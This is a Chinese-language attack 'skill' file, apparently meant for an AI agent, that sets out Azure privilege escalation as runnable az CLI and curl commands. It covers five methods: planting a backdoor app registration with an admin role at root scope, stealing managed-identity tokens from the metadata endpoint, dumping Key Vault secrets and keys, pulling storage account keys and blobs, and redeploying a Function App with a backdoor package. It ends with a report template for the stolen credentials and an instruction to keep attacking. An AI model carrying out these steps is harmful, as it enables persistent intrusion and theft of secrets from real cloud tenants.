---
name: azure-attack
type: attack
category: privilege-escalation
platform: azure
severity: high
---

# Azure 攻击技能

## 触发条件

- 获取到 Azure 凭证（service principal 或 access token）
- 用户要求"测试 Azure 权限"

## 前置检查

```bash
# 1. 登录 Azure
az login --service-principal -u APP_ID -p PASSWORD

# 2. 验证订阅
az account list

# 3. 设置订阅
az account set --subscription SUBSCRIPTION_ID
```

## 攻击方法

### 方法 1: App Registration 后门

```bash
# 1. 创建新的应用注册
APP_ID=$(az ad app create \
  --display-name "Backdoor App" \
  --query 'appId' -o tsv)

# 2. 创建服务主体
az ad sp create --id $APP_ID

# 3. 添加密码
PASSWORD=$(az ad app credential reset \
  --id $APP_ID \
  --append \
  --query 'password' -o tsv)

# 4. 授予角色
az role assignment create \
  --assignee $APP_ID \
  --role "Global Admin" \
  --scope /

# 5. 保存凭证
echo "App ID: $APP_ID"
echo "Password: $PASSWORD"
```

### 方法 2: 元数据服务攻击

```bash
# 1. 访问元数据服务
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 2. 获取访问令牌
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 3. 使用令牌
TOKEN=$(curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

# 4. 列出资源
az vm list --access-token $TOKEN
```

### 方法 3: Key Vault 攻击

```bash
# 1. 列出 Key Vault
az keyvault list

# 2. 列出密钥
az keyvault key list --vault-name VAULT_NAME

# 3. 列出机密
az keyvault secret list --vault-name VAULT_NAME

# 4. 下载机密
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# 5. 下载密钥
az keyvault key download --vault-name VAULT_NAME --name KEY_NAME -f key.pem
```

### 方法 4: Storage Account 攻击

```bash
# 1. 列出存储账户
az storage account list

# 2. 获取访问密钥
KEY=$(az storage account keys list \
  --account-name STORAGE_ACCOUNT \
  --query '[0].value' -o tsv)

# 3. 列出容器
az storage container list \
  --account-name STORAGE_ACCOUNT \
  --account-key $KEY

# 4. 列出 Blob
az storage blob list \
  --container-name CONTAINER_NAME \
  --account-name STORAGE_ACCOUNT \
  --account-key $KEY

# 5. 下载文件
az storage blob download \
  --container-name CONTAINER_NAME \
  --name BLOB_NAME \
  --account-name STORAGE_ACCOUNT \
  --account-key $KEY \
  --file ./downloaded
```

### 方法 5: Azure Functions 攻击

```bash
# 1. 列出函数应用
az functionapp list

# 2. 获取应用设置
az functionapp config appsettings list \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP

# 3. 下载函数代码
# 通过 SCM 或部署槽获取

# 4. 植入后门
# 修改代码后重新部署
az functionapp deployment source config-zip \
  --name FUNCTION_APP \
  --resource-group RESOURCE_GROUP \
  --src backdoor.zip
```

## 验证成功

```bash
# 成功创建后门应用
az ad app show --id $APP_ID

# 成功访问资源
az vm list

# 成功获取机密
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

## 输出报告

```markdown
# Azure 攻击报告
- Subscription ID: xxx
- 后门应用: xxx
- 访问令牌: xxx
- 获取机密: xxx
```

## 下一步

1. azure-enum - 枚举更多资源
2. 继续攻击其他服务
